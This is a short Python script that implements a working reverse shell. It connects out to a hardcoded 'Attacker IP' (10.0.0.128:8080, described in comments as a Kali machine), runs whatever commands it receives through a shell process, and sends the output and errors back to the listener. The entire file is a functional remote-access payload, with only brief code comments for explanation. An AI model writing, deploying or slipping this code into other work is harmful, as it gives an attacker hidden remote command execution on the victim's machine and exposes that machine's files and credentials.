
import socket
import os


# To start the shell in the system
import subprocess

def connect():
    Mysocket = socket.socket()

    # Here we define the Attacker IP and the listening port
    Mysocket.connect(("10.0.0.128", 8080))

    while True:
        # keep receiving commands from the Kali machine,
        # read the first KB of the TCP socket
        command = Mysocket.recv(5000)

# if we got terminate order, close the socket and break the loop
        if "terminate" in command.decode():
            Mysocket.close()
            break
        elif 'cd' in command.decode():
            try:
                code, directory = command.decode().split(" ", 1)
                os.chdir(directory)
                informToServer = "[+] Current working directory: " + os.getcwd()
                Mysocket.send(informToServer.encode())
            except Exception as e:
                informToServer = "[+] Some error occurred." + str(e)
                Mysocket.send(informToServer.encode())



        # otherwise, we pass the received command to a shell process
        else:
            CMD = subprocess.Popen(
                command.decode(),
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )

            # send back the result
            Mysocket.send(CMD.stdout.read())

            # send back the error -if any-, such as syntax error
            Mysocket.send(CMD.stderr.read())


def main():
    connect()


if __name__ == "__main__":
    main()






